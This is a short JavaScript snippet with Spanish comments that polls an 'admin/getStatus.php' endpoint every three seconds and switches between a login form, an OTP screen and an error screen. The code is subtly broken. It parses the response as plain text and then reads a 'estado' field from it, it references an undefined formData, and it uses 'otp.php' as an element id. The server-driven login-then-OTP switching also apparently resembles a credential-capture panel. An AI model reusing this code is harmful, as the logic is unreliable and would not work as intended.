function verificarEstado() {

  fetch("admin/getStatus.php", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.text())
      .then((data) => {
      // Mostrar solo la pantalla correspondiente
      if (data.estado === "login") {
        document.getElementById("loginForm").style.display = 'block';
      } else if (data.estado === "otp") {
        document.getElementById("otp.php").style.display = 'block';
      } else {
        document.getElementById("error-pantalla").style.display = 'block';
      }
    })
    .catch((err) => {
      console.error("Error:", err);
      // Opcional: Mostrar pantalla de error genérico
      document.getElementById("error-pantalla").style.display = 'block';
    });
}

// Llamar cada 3 segundos (polling)
setInterval(verificarEstado, 3000);

// Primera carga
verificarEstado();